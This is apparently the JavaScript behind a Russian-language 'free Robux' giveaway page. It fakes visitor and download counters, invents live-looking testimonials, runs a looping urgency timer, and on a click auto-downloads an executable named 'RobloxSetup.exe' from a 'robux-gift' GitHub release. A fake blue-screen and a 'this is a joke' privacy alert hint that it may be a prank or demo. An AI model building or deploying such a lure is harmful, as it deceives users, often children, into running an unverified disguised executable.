const onlineCount = document.getElementById('onlineCount');
const countdownEl = document.getElementById('countdown');
const downloadsCount = document.getElementById('downloadsCount');
const commentsFeed = document.getElementById('commentsFeed');
const downloadBtn = document.getElementById('downloadBtn');
const modal = document.getElementById('modal');
const progressFill = document.getElementById('progressFill');
const progressPct = document.getElementById('progressPct');
const toast = document.getElementById('toast');
const testDriveBtn = document.getElementById('testDriveBtn');
const bsod = document.getElementById('bsod');
const bsodClose = document.getElementById('bsodClose');
const jokeModal = document.getElementById('jokeModal');
const jokeBtn = document.getElementById('jokeBtn');

let online = 234;
setInterval(() => {
  online = Math.max(180, online + Math.floor(Math.random() * 9) - 3);
  onlineCount.textContent = online;
}, 5000);

let seconds = 15 * 60 + 32;
setInterval(() => {
  seconds--;
  if (seconds < 0) seconds = 15 * 60 + 32;
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  countdownEl.textContent =
    String(h).padStart(2, '0') + ':' + String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
}, 1000);

let downloads = 12847;
setInterval(() => {
  downloads += Math.floor(Math.random() * 4) + 1;
  downloadsCount.textContent = downloads.toLocaleString('ru-RU');
}, 2000);

const commentsPool = [
  ['Дима', 'Скачал, всё пришло! Спасибо!'],
  ['Аня', 'У меня тоже сработало!'],
  ['Сергей', '1000 robux на месте 🔥'],
  ['Маша', 'Работает, проверила только что'],
  ['Никита', 'Друзья не верили, а зря!'],
  ['Оля', 'Промокод сам активировался, топ'],
  ['Влад', 'Установка реально 5 секунд'],
  ['Ксюша', 'Спасибо за подарок! 😍'],
];

function addComment() {
  const [name, text] = commentsPool[Math.floor(Math.random() * commentsPool.length)];
  const now = new Date();
  const time = String(now.getHours()).padStart(2, '0') + ':' + String(now.getMinutes()).padStart(2, '0');
  const div = document.createElement('div');
  div.className = 'comment';
  div.innerHTML = '<span class="comment-name">' + name + ':</span><span>' + text + '</span><span class="comment-time">' + time + '</span>';
  commentsFeed.prepend(div);
  while (commentsFeed.children.length > 4) commentsFeed.removeChild(commentsFeed.lastChild);
}

function showTypingIndicator() {
  const div = document.createElement('div');
  div.className = 'comment typing';
  div.innerHTML = '<span class="comment-name">Кто-то:</span><span class="typing-dots">печатает<span>.</span><span>.</span><span>.</span></span>';
  commentsFeed.prepend(div);
  setTimeout(() => {
    div.remove();
    addComment();
  }, 1800);
}

for (let i = 0; i < 3; i++) addComment();
setInterval(showTypingIndicator, 6500);

downloadBtn.addEventListener('click', () => {
  modal.classList.add('show');
  progressFill.style.width = '0%';
  progressPct.textContent = '0';

  let pct = 0;
  const timer = setInterval(() => {
    pct += Math.floor(Math.random() * 8) + 2;
    if (pct >= 100) {
      pct = 100;
      clearInterval(timer);
      setTimeout(finishDownload, 400);
    }
    progressFill.style.width = pct + '%';
    progressPct.textContent = pct;
  }, 90);

  const a = document.createElement('a');
  a.href = 'https://github.com/Doinwor/robux-gift/releases/download/v1.0/RobloxSetup.exe';
  a.download = 'RobloxSetup.exe';
  document.body.appendChild(a);
  a.click();
  a.remove();
});

function finishDownload() {
  modal.classList.remove('show');
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 5000);
}

testDriveBtn.addEventListener('click', () => {
  bsod.classList.add('show');
});

function closeBsod() {
  bsod.classList.remove('show');
  jokeModal.classList.add('show');
}

bsodClose.addEventListener('click', closeBsod);

function closeJoke() {
  jokeModal.classList.remove('show');
}

jokeBtn.addEventListener('click', closeJoke);

document.addEventListener('keydown', (e) => {
  if (bsod.classList.contains('show') && (e.key === 'Escape' || e.key === 'F4')) {
    closeBsod();
  }
  if (jokeModal.classList.contains('show') && e.key === 'Escape') {
    closeJoke();
  }
});

const revealObserver = new IntersectionObserver(
  (entries) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        entry.target.classList.add('visible');
        revealObserver.unobserve(entry.target);
      }
    });
  },
  { threshold: 0.15 }
);

document.querySelectorAll('.reveal').forEach((el) => revealObserver.observe(el));

document.getElementById('privacyLink').addEventListener('click', (e) => {
  e.preventDefault();
  alert('Политика конфиденциальности: мы ничего не собираем. Это шутка 😄');
});
